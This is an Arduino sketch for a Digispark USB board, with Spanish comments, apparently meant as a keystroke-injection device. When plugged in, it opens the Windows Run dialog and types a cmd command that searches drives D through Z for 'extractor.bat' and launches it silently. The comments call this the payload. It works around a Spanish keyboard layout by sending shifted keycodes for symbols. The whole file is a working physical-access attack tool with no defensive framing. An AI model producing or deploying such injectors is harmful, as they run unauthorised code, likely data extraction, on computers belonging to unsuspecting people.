#include "DigiKeyboard.h"

void setup() {
  // vacío
}

void loop() {
  // Espera inicial para el reconocimiento del hardware
  DigiKeyboard.delay(2000);

  // 1. Abrir Ejecutar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // 2. Empezar a escribir el comando: cmd /c "for %d in (
  DigiKeyboard.print("cmd ");
  
  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 
  
  DigiKeyboard.print("c ");

  // Imprimir comillas iniciales '"' -> Shift + 2
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("for %d in ");

  // Imprimir paréntesis abierto '(' -> Shift + 8
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT); 

  // Unidades de disco
  DigiKeyboard.print("D E F G H I J K L M N O P Q R S T U V W X Y Z");

  // Imprimir paréntesis cerrado ')' -> Shift + 9
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT); 

  // 3. Continuar con la condición: do if exist %d:/extractor.bat
  DigiKeyboard.print(" do if exist %d");

  // Imprimir dos puntos ':' -> Shift + punto (en la mayoría de teclados es keycode 0x37 o KEY_PERIOD)
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); 

  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("extractor.bat start ");

  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("b %d");

  // Imprimir dos puntos ':' -> Shift + 0x37
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); 

  // Imprimir la barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT); 

  DigiKeyboard.print("extractor.bat");

  // Imprimir comillas finales '"' -> Shift + 2
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 

  // 4. Ejecutar el payload completo
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Esperar un momento y asegurar ciclo infinito pasivo
  DigiKeyboard.delay(5000);
  for(;;){}
}